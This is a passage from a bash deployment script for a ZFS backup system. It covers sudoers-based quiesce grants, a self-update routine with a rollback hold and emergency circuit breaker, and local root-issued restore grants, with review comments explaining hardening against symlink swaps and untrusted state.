    # is the SET of files touched -- these three, and nothing else.

    # Step 0, update path only: switch the live grant OFF before anything it
    # governs changes. On a first install there is no rule yet and this is
    # skipped, which is why a fresh enrolment never sees the outage.
    if [ "$pre_rule" -eq 1 ]; then
        did_rule=1
        if ! mv -f "$rule" "$rule.zqg-bak"; then
            _grant_rollback
            warn "could not suspend the existing rule $rule before updating it -- the grant for $account is unchanged"; return 1
        fi
    fi
    did_allow=1
    if ! mv -f "$allow.zqg-new" "$allow"; then
        _grant_rollback
        warn "could not commit $allow -- no quiesce grant was created for $account"; return 1
    fi
    did_helper=1
    if ! mv -f "$dest.zqg-new" "$dest"; then
        _grant_rollback
        warn "could not commit $dest -- no quiesce grant was created for $account"; return 1
    fi
    did_rule=1
    if ! mv -f "$rule.zqg-new" "$rule"; then
        _grant_rollback
        warn "could not commit $rule -- no quiesce grant was created for $account"; return 1
    fi
    rm -f "$tmp_allow" "$tmp_rule"; tmp_allow=""; tmp_rule=""
    _grant_sweep quiet

    if [ "$pre_rule" -eq 1 ] || [ "$pre_allow" -eq 1 ]; then
        log "updated the guest quiesce grant for $account (helper $dest, whitelist $allow, rule $rule)"
    else
        log "granted guest quiesce to $account (helper $dest, whitelist $allow, rule $rule)"
    fi
    return 0
}

# The other half of install_quiesce_grant (REV-20260731-007 §3.7): a removed
# backup relationship must not silently leave privileged artifacts behind, and
# an admin should not have to know which of them are shared.
#
# Per-account (removed): the whitelist and the sudoers rule. Together they are
# the whole grant -- without them the helper refuses this account with rc=4.
# Shared (kept, and SAID so): /usr/local/sbin/zfs-quiesce-helper is one file for
# every peer on this host. Removing it would silently break the other
# relationships, so it stays and the operator is told it stays.
revoke_quiesce_grant() {
    local account="$1" removed=0
    local allow="/etc/zfs-quiesce-allow/$account"
    local rule="/etc/sudoers.d/zfs-quiesce-$account"

    if [ -e "$allow" ]; then
        rm -f "$allow" && { log "removed the quiesce whitelist $allow"; removed=1; } \
            || warn "could not remove $allow -- $account may still be able to quiesce guests here"
    fi
    if [ -e "$rule" ]; then
        rm -f "$rule" && { log "removed the sudoers rule $rule"; removed=1; } \
            || warn "could not remove $rule -- $account may still reach the helper through sudo"
    fi

    if [ "$removed" -eq 0 ]; then
        log "no quiesce grant found for '$account' on this host -- nothing to revoke"
        return 0
    fi

    # A leftover broken rule would break sudo for everyone, so confirm the
    # directory still parses after the removal rather than assuming it does.
    local vb=""
    for c in visudo /usr/sbin/visudo /sbin/visudo; do
        command -v "$c" >/dev/null 2>&1 && { vb="$c"; break; }
    done
    if [ -n "$vb" ] && ! "$vb" -c >/dev/null 2>&1; then
        warn "/etc/sudoers no longer parses cleanly after removing $rule -- inspect it NOW with '$vb -c'"
    fi

    if [ -x /usr/local/sbin/zfs-quiesce-helper ]; then
        log "/usr/local/sbin/zfs-quiesce-helper stays: it is SHARED by every peer on this host, and removing it would break the others. Without a whitelist and a sudoers rule it refuses '$account' anyway."
        if [ -d /etc/zfs-quiesce-allow ] && quiesce_allow_dir_empty /etc/zfs-quiesce-allow; then
            log "no account on this host has a quiesce grant any more -- remove the helper by hand if you want it gone: rm -f /usr/local/sbin/zfs-quiesce-helper"
        fi
    fi
    return 0
}

if [ "$JOIN_CHECK" -eq 1 ]; then
    do_join_check
    exit $?
fi

# Same reasoning as JOIN_CHECK above: the file-format half of --commit-scope
# needs no root and no `zfs`, so it runs before the root check and is what
# test/scope drives for the refusal paths.
if [ "$COMMIT_SCOPE_CHECK" -eq 1 ]; then
    do_commit_scope_check "$COMMIT_SCOPE_LABEL"
    echo "scope file OK: $COMMIT_SCOPE_SFILE"
    printf '  %-12s %s\n' "account" "$COMMIT_SCOPE_ACCOUNT"
    for scope_root_shown in "${SCOPE_ROOTS[@]}"; do
        printf '  %-12s %s (parent=%s children=%s)\n' "root" "$scope_root_shown" \
            "${SCOPE_PARENT[$scope_root_shown]}" "${SCOPE_CHILDREN[$scope_root_shown]}"
    done
    exit 0
fi

# Same reasoning: the manifest/path half of --draft-scope needs no root and
# no `zfs`, so a malformed manifest or an already-existing scope file is
# refused before any inventory work is even attempted.
if [ "$DRAFT_SCOPE_CHECK" -eq 1 ]; then
    do_draft_scope_check "$DRAFT_SCOPE_LABEL"
    echo "draft-scope OK: would write $DRAFT_SCOPE_SFILE"
    printf '  %-12s %s\n' "account" "$DRAFT_SCOPE_ACCOUNT"
    exit 0
fi

# Stands alone on purpose: the grant lives on the SOURCE host, which is the
# --join side, and that side has no pairing manifest describing the initiator.
# So teardown cannot be inferred from one -- it is named explicitly.
if [ -n "$REVOKE_QUIESCE_ACCOUNT" ]; then
    pc_is_account "$REVOKE_QUIESCE_ACCOUNT" \
        || die "--revoke-quiesce: '$REVOKE_QUIESCE_ACCOUNT' is not a valid account name"
    revoke_quiesce_grant "$REVOKE_QUIESCE_ACCOUNT"
    exit $?
fi

# --join's PREFLIGHT, hoisted here on purpose. do_join itself validated before
# its own mutations, but it is dispatched only after Phases 1-7 -- package
# installation, the checkout update, cron changes. So a hostile package still
# provoked all of those before anything looked at it, which is not what "no
# persistent change before validation" means. Validate first, keep the result,
# and let do_join use it later instead of parsing a second, independent copy.
if [ "$JOIN_MODE" -eq 1 ]; then
    [ -n "$JOIN_PACKAGE" ] || die "--join needs a package path"
    printf -v JOIN_RERUN_COMMAND './deploy.sh --join=%q' "$JOIN_PACKAGE"
    JOIN_RERUN_NEEDED=1
    trap deploy_exit_cleanup EXIT
    prepare_package "$JOIN_PACKAGE"
    log "package preflight OK (sha256 ${PKG_SHA256:-?}) -- continuing with deployment phases"
fi

# ============================================================================
# Self-update: the hourly pull, a rollback that STAYS rolled back, and an
# explicit way to resume.
#
# REV-20260729-003 F1. The previous version was one cron line:
#
#     git rev-parse HEAD > last-known-good; git pull --ff-only origin main
#
# which recorded the CURRENT revision every hour whether anything changed or
# not. So an hour after a bad update the recorded "rollback point" was the bad
# revision itself, and a `git reset --hard` was undone by the next hourly pull
# sixty minutes later. The file was also called last-known-good while nothing
# established that anything was good.
#
# Renamed to what it is (the previous revision), written ONLY on a real change,
# and rollback now leaves a hold that stops the next run from undoing it.
#
# REV-20260729-004 F1/F2/F3 (verification of the above): the reviewer found
# three problems with that first pass, all fixed here:
#
#  F1 -- the state dir defaulted to $ALERT_SHARED_DIR, which Phase 4 makes
#        2775 root:zfsalert ON PURPOSE so a delegated backup account can queue
#        alert data. Group-write on the DIRECTORY also let that account
#        remove/replace previous-revision or update-hold -- i.e. undo an
#        administrator's rollback, or swap a state file for a symlink before
#        root next wrote it. A backup account has no business deciding what
#        root's next `git reset --hard` targets. Moved to a root-private
#        directory under /root (already 0700, same reasoning Phase 4 already
#        uses to keep notify-fail's own scripts out of that account's reach),
#        and every access now refuses a symlinked directory or state file
#        instead of following it.
#  F2 -- every state write used to be an unchecked `>` redirect under
#        `set -uo pipefail` (not `set -e`): a write failure was silently
#        ignored and the caller kept going as if it had succeeded. All state
#        transitions below are checked, and a write that cannot be trusted
#        stops the operation rather than reporting success on top of it.
#  F3 -- `--self-update` ran `merge --ff-only` without ever asking whether the
#        worktree was clean. `--ff-only` happily keeps a local modification in
#        a file the incoming commits never touched, so the host would then run
#        a mix of reviewed code and unreviewed local edits, as root. Checked
#        explicitly now, before any state is touched.
#
# REV-20260730-001 (review of the above): the reviewer found that all of this
# still lived inside $REPO_DIR/deploy.sh -- the exact tree `--rollback` resets
# with `git reset --hard`. Rolling back from a post-fix revision to a pre-fix
# one checked out the OLD deploy.sh, which knew nothing about the hold (or
# looked for it at the old F1 location), so the very next hourly cron tick
# undid the rollback within the hour. Reproduced live on all 4 hosts.
#
#  F1 -- fixed by moving the enforcement OUTSIDE the git tree: update-control.sh
#        (repo root) is deployed by Phase 7 into $UPDATE_STATE_DIR, which is
#        root-private and never touched by `git reset --hard $REPO_DIR`. Once
#        deployed, the hourly cron line and the dispatch just below both exec
#        that copy instead of running the logic built into whatever $REPO_DIR
#        happens to be. The functions below remain ONLY as the bootstrap
#        fallback for a host that has never successfully deployed the wrapper
#        yet (first-ever run, or the wrapper was removed by hand).
#  F2 -- several branches used to just `warn` when a hold write itself failed,
#        leaving the hourly cron entry able to keep retrying. `emergency_disable`
#        (defined once, here and in update-control.sh) escalates: try the hold
#        file, then removing exec permission on the invoked script, then
#        removing its own cron line -- so a write failure cannot silently leave
#        automatic updates enabled.
# ============================================================================
UPDATE_STATE_DIR="${UPDATE_STATE_DIR:-/root/.zfs-snapshot-all-update-state}"
PREV_REV_FILE="$UPDATE_STATE_DIR/previous-revision"
UPDATE_HOLD_FILE="$UPDATE_STATE_DIR/update-hold"

# Fails closed: a symlinked or group/world-writable state directory is treated
# as untrustworthy and stops the caller rather than being used anyway. Every
# do_* function below calls this before touching $PREV_REV_FILE/$UPDATE_HOLD_FILE.
ensure_update_state_dir() {
    if [ -L "$UPDATE_STATE_DIR" ]; then
        warn "$UPDATE_STATE_DIR is a symlink -- refusing to follow it. Remove it by hand and re-run: ls -la $UPDATE_STATE_DIR"
        return 1
    fi
    if [ -e "$UPDATE_STATE_DIR" ] && [ ! -d "$UPDATE_STATE_DIR" ]; then
        warn "$UPDATE_STATE_DIR exists and is not a directory -- refusing to use it."
        return 1
    fi
    if [ ! -e "$UPDATE_STATE_DIR" ]; then
        mkdir -m 0700 -p "$UPDATE_STATE_DIR" || { warn "mkdir -p $UPDATE_STATE_DIR failed"; return 1; }
    fi
    local _mode
    _mode=$(stat -c '%a' "$UPDATE_STATE_DIR" 2>/dev/null) || { warn "cannot stat $UPDATE_STATE_DIR"; return 1; }
    # Bitwise, not glob-on-the-last-digit: 0022 isolates group-write(0020) and
    # other-write(0002) regardless of an extra setuid/setgid/sticky leading
    # digit in $_mode (e.g. a stray 2775 must still be caught).
    if [ $(( 0${_mode} & 0022 )) -ne 0 ]; then
        warn "$UPDATE_STATE_DIR is group- or world-writable (mode $_mode) -- refusing to trust it as update-control state. Fix: chmod 0700 $UPDATE_STATE_DIR"
        return 1
    fi
    return 0
}

# Atomic and symlink-hostile: `printf ... > "$dst"` opens $dst by name, which
# FOLLOWS a symlink there and writes through it -- exactly the swap a
# delegated account could set up (F1). `rename(2)`, which `mv` uses, replaces
# the directory ENTRY instead, so writing into a private tmpfile first and
# renaming it over $dst is safe even if $dst is currently a symlink: the
# rename clobbers the link itself, never the link's target.
write_state_file() {
    local dst="$1" content="$2" tmp
    if [ -L "$dst" ]; then
        warn "$dst is a symlink -- refusing to write through it. Remove it by hand: ls -la $dst"
        return 1
    fi
    tmp=$(mktemp "$UPDATE_STATE_DIR/.tmp.XXXXXX" 2>/dev/null) || { warn "mktemp in $UPDATE_STATE_DIR failed"; return 1; }
    if ! printf '%s\n' "$content" > "$tmp" 2>/dev/null; then
        warn "write to $tmp failed"; rm -f "$tmp"; return 1
    fi
    if ! mv -f "$tmp" "$dst" 2>/dev/null; then
        warn "rename $tmp -> $dst failed"; rm -f "$tmp"; return 1
    fi
    return 0
}

# Companion read: refuses a symlinked source instead of following it (a plain
# `cat` would happily print whatever the link points at).
read_state_file() {
    local src="$1"
    if [ -L "$src" ]; then
        warn "$src is a symlink -- refusing to read through it. Remove it by hand: ls -la $src"
        return 1
    fi
    [ -f "$src" ] || return 1
    cat "$src" 2>/dev/null
}

# `rm -f` on a symlink only ever removes the link entry, never its target --
# so this is not a symlink-following hazard the way read/write are. It still
# refuses, on purpose: a state file that has been swapped for a symlink is
# evidence of tampering, and papering over it by silently removing the link
# would hide that from the operator.
remove_state_file() {
    local dst="$1"
    if [ -L "$dst" ]; then
        warn "$dst is a symlink, not the state file this script wrote -- refusing to remove it automatically. Inspect and remove by hand: ls -la $dst"
        return 1
    fi
    [ -e "$dst" ] || return 0
    rm -f "$dst" 2>/dev/null
}

# REV-20260730-001 F2, bootstrap-fallback copy (see update-control.sh for the
# primary one, used once the wrapper is deployed). No self-path chmod step
# here on purpose: $0 in this fallback path is deploy.sh itself, which the
# whole fleet also uses for the full deployment sequence, not just updates --
# disabling it entirely would be a bigger hammer than the situation calls for.
emergency_disable() {
    local reason="$1"
    if write_state_file "$UPDATE_HOLD_FILE" "$reason"; then
        return 0
    fi
    warn "could not write the update hold at $UPDATE_HOLD_FILE -- attempting an emergency circuit breaker instead"
    if crontab -l 2>/dev/null | grep -vF "$REPO_DIR/deploy.sh --self-update" | crontab - 2>/dev/null; then
        warn "removed the hourly cron line invoking $REPO_DIR/deploy.sh --self-update as a last-resort circuit breaker -- re-add it by hand once $UPDATE_STATE_DIR is fixed"
        return 0
    fi
    warn "CRITICAL: could not write a hold, could not remove the cron line -- $UPDATE_STATE_DIR needs immediate manual attention or this host will keep retrying hourly"
    return 1
}

# The ultimate fallback if this script itself is what a bad update broke:
#   git -C <repo> reset --hard <sha>   and remove the cron line by hand.
# Everything below is convenience on top of that, which is why rollback stays
# two plain git commands rather than anything clever.
do_self_update() {
    [ -d "$REPO_DIR/.git" ] || die "no git checkout at $REPO_DIR"
    ensure_update_state_dir || { warn "refusing to update: $UPDATE_STATE_DIR is not safe to use as update-control state"; return 1; }

    if [ -L "$UPDATE_HOLD_FILE" ]; then
        warn "$UPDATE_HOLD_FILE is a symlink -- treating update-control state as tampered with, refusing to update. Resolve by hand: ls -la $UPDATE_HOLD_FILE"
        return 1
    fi
    if [ -e "$UPDATE_HOLD_FILE" ]; then
        log "updates are HELD ($(read_state_file "$UPDATE_HOLD_FILE")) -- not updating. Resume with: bash $REPO_DIR/deploy.sh --resume-updates"
        return 0
    fi
    if [ -L "$PREV_REV_FILE" ]; then
        warn "$PREV_REV_FILE is a symlink -- treating update-control state as tampered with, refusing to update. Resolve by hand: ls -la $PREV_REV_FILE"
        return 1
    fi

    git -C "$REPO_DIR" fetch --quiet origin main 2>/dev/null         || { warn "fetch failed -- leaving $REPO_DIR on its current revision"; return 1; }

    local current target
    current=$(git -C "$REPO_DIR" rev-parse HEAD) || return 1
    target=$(git -C "$REPO_DIR" rev-parse FETCH_HEAD) || return 1

    # F3: a dirty worktree must not be fast-forwarded. `--ff-only` succeeds
    # even with an unrelated local edit in play, and the host then runs a mix
    # of the reviewed target revision and whatever that local edit was.
    local dirty
    dirty=$(git -C "$REPO_DIR" status --porcelain 2>&1)

    # The whole point of the F1 (REV-20260729-003) finding: a no-op run must
    # not consume the rollback point. Nothing changed, so nothing is recorded
    # -- and since nothing is recorded, a dirty tree here is worth a warning,
    # not a failure (acceptance criterion: report, don't overwrite state).
    if [ "$current" = "$target" ]; then
        [ -n "$dirty" ] && warn "$REPO_DIR has uncommitted changes -- nothing to update, but this is worth a look: git -C $REPO_DIR status"
        log "already at $(printf '%.8s' "$current") -- nothing to update"
        return 0
    fi

    if [ -n "$dirty" ]; then
        warn "$REPO_DIR is not clean -- refusing to update to $(printf '%.8s' "$target"). Running a mix of reviewed and unreviewed local code as root is exactly what this check exists to prevent. Resolve by hand: git -C $REPO_DIR status"
        return 1
    fi

    # Recorded BEFORE the new revision is activated, and restored if activating
    # it fails, so a failed update never eats the rollback point either. F2:
    # if this durable record cannot be written, B is never activated -- a
    # rollback point that might not exist is worse than not updating at all.
    local prior=""
    if [ -e "$PREV_REV_FILE" ]; then
        prior=$(read_state_file "$PREV_REV_FILE") || { warn "could not read $PREV_REV_FILE -- refusing to update with an unreadable rollback point"; return 1; }
    fi
    write_state_file "$PREV_REV_FILE" "$current"         || { warn "could not durably record $current at $PREV_REV_FILE -- refusing to activate $(printf '%.8s' "$target") without a working rollback point"; return 1; }

    if ! git -C "$REPO_DIR" merge --ff-only "$target" >/dev/null 2>&1; then
        # Best-effort restoration of the pointer this function itself just
        # overwrote. If THAT also fails, the state is genuinely uncertain --
        # the safe response is an automatic hold, not silent hourly retries.
        local _restore_ok=1
        if [ -n "$prior" ]; then
            write_state_file "$PREV_REV_FILE" "$prior" || _restore_ok=0
        else
            remove_state_file "$PREV_REV_FILE" || _restore_ok=0
        fi
        if [ "$_restore_ok" -eq 0 ]; then
            warn "fast-forward to $(printf '%.8s' "$target") failed AND the rollback pointer at $PREV_REV_FILE could not be restored -- state is uncertain, holding automatic updates"
            emergency_disable "held automatically: rollback-pointer restore failed after a bad fast-forward on $(date '+%Y-%m-%d %H:%M:%S')" \
                || warn "emergency circuit breaker also failed -- $UPDATE_STATE_DIR needs manual attention before the next hourly run"
        fi
        warn "fast-forward to $(printf '%.8s' "$target") failed -- still on $(printf '%.8s' "$current"). Local modifications in $REPO_DIR are the usual cause: git -C $REPO_DIR status"
        return 1
    fi
    log "updated $(printf '%.8s' "$current") -> $(printf '%.8s' "$target") (rollback point recorded)"
    return 0
}

do_rollback() {
    [ -d "$REPO_DIR/.git" ] || die "no git checkout at $REPO_DIR"
    ensure_update_state_dir || die "$UPDATE_STATE_DIR is not safe to use as update-control state -- see above"
    local target
    target=$(read_state_file "$PREV_REV_FILE") || die "no previous revision recorded at $PREV_REV_FILE (or it is not a plain file) -- nothing to roll back to. Pick a revision by hand: git -C $REPO_DIR log --oneline"
    [ -n "$target" ] || die "$PREV_REV_FILE is empty -- nothing to roll back to"
    local from
    from=$(git -C "$REPO_DIR" rev-parse HEAD) || die "cannot resolve current HEAD in $REPO_DIR"
    git -C "$REPO_DIR" cat-file -e "${target}^{commit}" 2>/dev/null         || die "recorded revision $target is not in $REPO_DIR -- resolve by hand"

    # F2: the hold is written BEFORE the reset, not after. If the reset then
    # fails partway, the host must come up HELD -- not silently retry the same
    # revision on the next hourly run because nothing ever recorded the
    # attempt. This also satisfies "never report success without a hold": if
    # this write fails, rollback aborts before touching the checkout at all.
    write_state_file "$UPDATE_HOLD_FILE"         "rollback $(printf '%.8s' "$from") -> $(printf '%.8s' "$target") started $(date '+%Y-%m-%d %H:%M:%S')"         || die "could not record an update hold at $UPDATE_HOLD_FILE -- refusing to roll back without one. Fix $UPDATE_STATE_DIR and retry."

    if ! git -C "$REPO_DIR" reset --hard "$target" >/dev/null 2>&1; then
        emergency_disable "rollback to $(printf '%.8s' "$target") FAILED at $(date '+%Y-%m-%d %H:%M:%S') -- checkout may be inconsistent, held for manual investigation" \
            || warn "emergency circuit breaker also failed after a failed reset -- $UPDATE_STATE_DIR needs manual attention immediately"
        die "git reset --hard $target failed -- automatic updates remain HELD, investigate $REPO_DIR by hand"
    fi

    write_state_file "$UPDATE_HOLD_FILE"         "rolled back from $(printf '%.8s' "$from") to $(printf '%.8s' "$target") on $(date '+%Y-%m-%d %H:%M:%S')"         || warn "rollback succeeded but could not refresh the hold message at $UPDATE_HOLD_FILE (the hold from before the reset is still in place)"

    log "rolled back $(printf '%.8s' "$from") -> $(printf '%.8s' "$target")"
    log "AUTOMATIC UPDATES ARE NOW HELD -- without this the next hourly run would pull the same revision straight back."
    log "When the fix is on main:  bash $REPO_DIR/deploy.sh --resume-updates"
    return 0
}

do_resume_updates() {
    ensure_update_state_dir || die "$UPDATE_STATE_DIR is not safe to use as update-control state -- see above"
    if [ -L "$UPDATE_HOLD_FILE" ]; then
        die "$UPDATE_HOLD_FILE is a symlink -- refusing to touch it. Resolve by hand: ls -la $UPDATE_HOLD_FILE"
    fi

    local had_hold=0 hold_content=""
    if [ -e "$UPDATE_HOLD_FILE" ]; then
        had_hold=1
        hold_content=$(read_state_file "$UPDATE_HOLD_FILE")
        log "removing update hold ($hold_content)"
        remove_state_file "$UPDATE_HOLD_FILE" || die "could not remove $UPDATE_HOLD_FILE -- hold left in place, refusing to update"
        [ -e "$UPDATE_HOLD_FILE" ] && die "removal of $UPDATE_HOLD_FILE did not take effect -- hold left in place, refusing to update"
    else
        log "no update hold in place -- nothing to resume"
    fi

    do_self_update
    local rc=$?
    # F2: an explicit --resume-updates that turns around and fails must not
    # leave the host silently eligible for hourly retries -- restore the hold
    # rather than defaulting open.
    if [ "$rc" -ne 0 ] && [ "$had_hold" -eq 1 ]; then
        warn "the explicit update after --resume-updates failed -- restoring the hold rather than leaving automatic updates enabled"
        emergency_disable "restored after a failed --resume-updates on $(date '+%Y-%m-%d %H:%M:%S') -- previous hold was: $hold_content" \
            || warn "emergency circuit breaker also failed after a failed resume -- automatic updates may retry hourly. Investigate $UPDATE_STATE_DIR by hand."
    fi
    return "$rc"
}

# The update path, not a deployment. Dispatched BEFORE the root check and before
# every phase (apt, cron, alerting): cron runs the first one hourly, and a
# rollback has to work when the thing being rolled back is what broke.
#
# No id check here on purpose. What actually protects these is the filesystem --
# $REPO_DIR is root-owned, so a non-root caller cannot reset it, and gets a plain
# git error saying so. An id check instead would have made the whole path
# untestable without root, and a test that needs root is a test whose own
# mistakes edit a live host. (The caveat this comment used to name -- the state
# dir being group zfsalert and group-writable -- is REV-20260729-004 F1, fixed
# above: $UPDATE_STATE_DIR is root-private now, separate from the alert dir.)
#
# REV-20260730-001 F1: once Phase 7 has deployed update-control.sh outside
# $REPO_DIR, prefer it unconditionally -- it is immune to whatever $REPO_DIR
# was just rolled back to, which the functions above (still built INTO
# $REPO_DIR/deploy.sh) are not. `exec` replaces this process entirely on
# success; the functions above only ever run as the bootstrap fallback for a
# host that has never deployed the wrapper yet.
DEPLOYED_UPDATE_CONTROL="$UPDATE_STATE_DIR/update-control.sh"
exec_deployed_update_control() {
    [ -e "$DEPLOYED_UPDATE_CONTROL" ] || return 1
    if [ -L "$DEPLOYED_UPDATE_CONTROL" ]; then
        warn "$DEPLOYED_UPDATE_CONTROL is a symlink -- refusing to exec through it, falling back to the logic built into this checkout"
        return 1
    fi
    [ -x "$DEPLOYED_UPDATE_CONTROL" ] || return 1
    exec "$DEPLOYED_UPDATE_CONTROL" "$1"
}
if [ "$SELF_UPDATE" -eq 1 ]; then exec_deployed_update_control --self-update; do_self_update; exit $?; fi
if [ "$ROLLBACK" -eq 1 ]; then exec_deployed_update_control --rollback; do_rollback; exit $?; fi
if [ "$RESUME_UPDATES" -eq 1 ]; then exec_deployed_update_control --resume-updates; do_resume_updates; exit $?; fi

# ==============================================================================
# RESTORE GRANT -- the fact on THIS machine that lets a collector overwrite it
# ==============================================================================
#
# Owner decision, 2026-08-26/27: the COLLECTOR starts a restore. It connects to
# the broken machine and writes. That is the direction the owner chose, and it
# is the reason this file exists at all: under the pull form the machine being
# overwritten would have been the one asking, and no capability to write onto
# another machine would ever have to exist.
#
# Under push it does. So the grant is the whole of the safety, and its two
# properties are the ones that make it worth anything:
#
#   * it is created HERE, by root, locally, on the machine at risk -- never by
#     the collector and never over the link;
#   * `replace` is never implied. A grant lets the collector write into free
#     space; destroying what is already there has to be said out loud, in the
#     grant, at a moment when nothing is broken and nobody is in a hurry.
#
# The grant does not expire and is not single-use (owner: a recovery may take an
# hour or a weekend, and a grant that dies mid-recovery dies at the worst
# possible moment). The price of that is a grant left behind stays live, so
# --show-restore exists and the gate reports it.
restore_grant_label_ok() {   # <label>
    case "${1:-}" in
        ''|.|..)              return 1 ;;
        *[!A-Za-z0-9._-]*)    return 1 ;;
    esac
    return 0
}

restore_grant_path() {   # <label>
    printf '%s/%s' "$RESTORE_GRANT_DIR" "$1"
}

# The modes a grant permits, as a stable, comparable string.
restore_grant_modes() {   # <replace 0|1>
    if [ "${1:-0}" -eq 1 ]; then printf 'create rewind replace'; else printf 'create rewind'; fi
}

restore_grant_read_modes() {   # <path> -> the modes it records, or nothing
    [ -r "$1" ] || return 1
    sed -n 's/^RESTORE_GRANT_MODES="\(.*\)"$/\1/p' "$1" 2>/dev/null | head -1
}

do_allow_restore() {
    local label="$ALLOW_RESTORE_LABEL"
    [ "$(id -u)" -eq 0 ] || die "--allow-restore must run as root ON THIS MACHINE. The point of the grant is that the machine at risk issues it locally; a grant that could be created any other way would not be one."
    restore_grant_label_ok "$label" \
        || die "--allow-restore='$label' is not a valid relationship label (letters, digits, dot, dash, underscore)"

    # The relationship has to EXIST here. A grant naming a relationship this
    # host has never enrolled is a typo, and a typo that silently creates a
    # live permission is the failure this whole mechanism is about.
    [ -d "$PAIR_GATE_STATE_DIR/$label" ] \
        || die "no relationship '$label' is enrolled on this host ($PAIR_GATE_STATE_DIR/$label does not exist) -- a grant for a relationship that does not exist would be a permission nobody can see. Check the label with: ls $PAIR_GATE_STATE_DIR"

    # WHO and WHAT, from the file that already recorded them: the peer manifest
    # this host wrote when it was joined. Same source as the backup delegation,
    # so a restore can never be granted on a wider scope than the relationship
    # was ever given, and nothing has to be typed twice at three in the morning.
    #
    # Read through peer_manifest_path and sourced, the way every other reader in
    # this file does it. A hand-rolled parser here would be a second opinion
    # about the manifest's format.
    local _pm; _pm="$(peer_manifest_path "$label")"
    [ -r "$_pm" ] || die "--allow-restore=$label: no pairing manifest at $_pm -- this host has no record of that relationship, so there is nobody to delegate to and no scope to delegate over."
    # shellcheck disable=SC1090
    . "$_pm"
    local account="${PEER_JOIN_ACCOUNT:-}"
    local RESTORE_GRANT_DATASETS="${PEER_JOIN_GRANTED_DATASETS:-}"
    [ -n "$account" ] || die "--allow-restore=$label: the manifest names no account, so a grant file would say yes to nobody."
    [ -n "$RESTORE_GRANT_DATASETS" ] || die "--allow-restore=$label: the manifest records no granted datasets, so the restore would have no scope. Refusing rather than guessing one."

    local want; want="$(restore_grant_modes "$ALLOW_RESTORE_REPLACE")"
    local gpath; gpath="$(restore_grant_path "$label")"

    if [ -f "$gpath" ]; then
        local have; have="$(restore_grant_read_modes "$gpath")" || have=""
        if [ "$have" = "$want" ]; then
            # Converges on a retry, the same way the gate's own `disable` verb
            # does: re-asserting what is already true is a success, and the
            # ORIGINAL grant time is the useful fact, so it is kept.
            log "restore grant for '$label' already says exactly this ($want) -- nothing changed"
            return 0
        fi
        die "a restore grant for '$label' already exists and says '${have:-<unreadable>}', not '$want'. Changing what a live grant permits is not a side effect of re-issuing it -- take it back first, deliberately:
    $0 --deny-restore=$label
  then grant again with the modes you want."
    fi

    mkdir -p "$RESTORE_GRANT_DIR" || die "could not create $RESTORE_GRANT_DIR"
    # root:root, and NOT group-writable. See the comment on RESTORE_GRANT_DIR:
    # the relationship's own state directory is group-writable by the delegated
    # account by design, so a grant kept there could be written by the very
    # account it exists to restrain.
    chown root:root "$RESTORE_GRANT_DIR" 2>/dev/null || :
    chmod 0755 "$RESTORE_GRANT_DIR" 2>/dev/null || :

    local tmp; tmp="$(mktemp "$RESTORE_GRANT_DIR/.grant.XXXXXX")" || die "could not write in $RESTORE_GRANT_DIR"
    {
        printf '# Restore grant. Written by deploy.sh --allow-restore on this host.\n'
        printf '# It permits the collector of relationship %s to restore ONTO this\n' "$label"
        printf '# machine. It does not expire; take it back with:\n'
        printf '#     deploy.sh --deny-restore=%s\n' "$label"
        printf 'RESTORE_GRANT_LABEL="%s"\n' "$label"
        printf 'RESTORE_GRANT_MODES="%s"\n' "$want"
        printf 'RESTORE_GRANT_AT="%s"\n' "$(date -Is 2>/dev/null || date)"
        printf 'RESTORE_GRANT_BY="%s@%s"\n' "${SUDO_USER:-root}" "$(hostname -s 2>/dev/null || hostname)"
    } > "$tmp" || { rm -f "$tmp"; die "could not write the grant"; }
    chown root:root "$tmp" 2>/dev/null || :
    chmod 0644 "$tmp" 2>/dev/null || :
    mv -f "$tmp" "$gpath" || { rm -f "$tmp"; die "could not install $gpath"; }

    # THE DELEGATION, and it is not a convenience: without it the grant is a file
    # saying yes next to an account that cannot act. Done AFTER the file, so a
    # failure here leaves a grant that refuses rather than a capability nobody
    # declared -- the safe order of the two.
    local _rg_ds _rg_failed=0
    if [ -n "${RESTORE_GRANT_DATASETS:-}" ]; then
        for _rg_ds in $RESTORE_GRANT_DATASETS; do
            zfs allow -u "$account" "$RESTORE_ZFS_PERMS" -- "$_rg_ds" 2>/dev/null \
                || { warn "could not delegate ($RESTORE_ZFS_PERMS) to '$account' on '$_rg_ds'"; _rg_failed=1; }
        done
        if [ "$_rg_failed" -eq 0 ]; then
            log "  delegated:    $RESTORE_ZFS_PERMS to '$account' on: $RESTORE_GRANT_DATASETS"
        else
            warn "  the grant FILE is written but the delegation is incomplete -- a restore will be refused by ZFS, not by the grant. Fix the allow above and re-run."
        fi
    fi

    log "restore grant WRITTEN: $gpath"
    log "  relationship: $label"
    log "  permits:      $want"
    if [ "$ALLOW_RESTORE_REPLACE" -eq 1 ]; then
        warn "  REPLACE IS INCLUDED. The collector for '$label' may now DESTROY data on this machine and put an older copy in its place. That is what you asked for; it stays true until you run: $0 --deny-restore=$label"
    else
        log "  replace:      NO -- the collector may write where there is free space, and may not overwrite what is already here. Add --replace only if you mean it."
    fi
    log "  this grant does NOT expire. See it with: $0 --show-restore=$label"
    return 0
}

do_deny_restore() {
    local label="$DENY_RESTORE_LABEL"
    [ "$(id -u)" -eq 0 ] || die "--deny-restore must run as root on this machine"
    restore_grant_label_ok "$label" \
        || die "--deny-restore='$label' is not a valid relationship label"
    local gpath; gpath="$(restore_grant_path "$label")"
    if [ ! -f "$gpath" ]; then
        # A no-op success, deliberately: the state the operator asked for is the
        # state that exists. Making this an error would mean a second
        # `--deny-restore` after a lost acknowledgement reports a failure while
        # the machine is, in fact, exactly as safe as they wanted.
        log "no restore grant for '$label' on this host -- nothing to take back"
        return 0
    fi
    local had; had="$(restore_grant_read_modes "$gpath")" || had=""
    # The same two facts, from the same file and the same reader, so the revoke
    # undoes exactly what the grant did rather than a set typed a second time.
    local RESTORE_GRANT_ACCOUNT="" RESTORE_GRANT_DATASETS=""
    local _pm; _pm="$(peer_manifest_path "$label")"
    if [ -r "$_pm" ]; then
        # shellcheck disable=SC1090
        . "$_pm"
        RESTORE_GRANT_ACCOUNT="${PEER_JOIN_ACCOUNT:-}"
        RESTORE_GRANT_DATASETS="${PEER_JOIN_GRANTED_DATASETS:-}"
    fi
    rm -f "$gpath" || die "could not remove $gpath"
    # Both halves, and the delegation first: while it is still delegated the
    # account CAN act, so removing that is the half that actually closes the
    # window. The file is the declaration; the allow is the capability.
    local _rd_ds
